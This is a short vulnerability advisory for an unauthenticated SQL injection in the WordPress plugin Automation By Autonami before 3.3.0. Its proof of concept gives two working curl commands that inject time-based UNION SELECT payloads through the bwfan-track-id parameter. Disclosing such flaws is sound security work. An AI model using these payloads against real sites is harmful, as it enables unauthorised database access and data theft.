## WordPress Plugin Vulnerabilities

# Automation By Autonami < 3.3.0 - Unauthenticated SQLi

### Description

The plugin does not sanitize and escape the bwfan-track-id parameter before using it in a SQL statement, allowing unauthenticated users to perform SQL injection attacks

### Proof of Concept

There are at least two ways to conduct the attack using the "bwfan-track-id" parameter:
time curl "$SITE\_URL/index.php?rest\_route=%2Fautonami-app%2Fv3%2Fcontacts%2F1%2Fengagements&mode=1&offset=0&limit=25&\_locale=user&bwfan-track-action=111&bwfan-track-id=test%27%20UNION%20SELECT%201%2C1%2C%27%27%2CNOW()%2CNOW()%2C1%2C%27%27%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C%27%27%2CNOW()%2C%27%27%2CNOW()%2C1%2C1%2Csleep(3)%23&bwfan-track-action=open"
or
time curl --url '$SITE\_URL/?bwfan-track-id=test%27%20UNION%20SELECT%201%2C1%2C%27%27%2CNOW()%2CNOW()%2C1%2C%27%27%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C%27%27%2CNOW()%2C%27%27%2CNOW()%2C1%2C1%2Csleep(10)%23&bwfan-track-action=click'
